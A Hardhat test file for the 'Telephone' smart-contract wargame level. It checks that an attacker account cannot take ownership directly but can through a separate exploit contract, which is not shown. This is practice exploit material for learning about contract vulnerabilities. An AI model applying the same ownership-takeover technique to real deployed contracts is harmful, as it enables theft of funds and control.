const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Telephone", () => {
  before(async function () {
    this.TelephoneFactory = await ethers.getContractFactory("Telephone");
    [owner, attacker] = await ethers.getSigners();
    (this.owner = owner), (this.attacker = attacker);
  });

  beforeEach(async function () {
    this.telephoneContract = await this.TelephoneFactory.deploy();
    await this.telephoneContract.deployed();
  });

  it("Attacker should not be the owner initially", async function () {
    expect(await this.telephoneContract.owner()).to.not.equal(
      this.attacker.address
    );
  });

  it("Should be able to change owner of the contract", async function () {
    // connect with the attacker account
    this.telephoneContract = await this.telephoneContract.connect(
      this.attacker
    );

    // deploy the exploit contract
    const telephoneExploit = await (
      await ethers.getContractFactory("TelephoneExploit")
    ).deploy(this.telephoneContract.address);
    await telephoneExploit.deployed();

    // Shouldn't be able to change the owner directly through the actual contract.
    await this.telephoneContract.changeOwner(this.attacker.address);

    expect(await this.telephoneContract.owner()).to.not.equal(
      this.attacker.address
    );

    // Should be able to change the owner if the exploit contract is used.
    await telephoneExploit.changeOwner(this.attacker.address);

    expect(await this.telephoneContract.owner()).to.equal(
      this.attacker.address
    );
  });
});
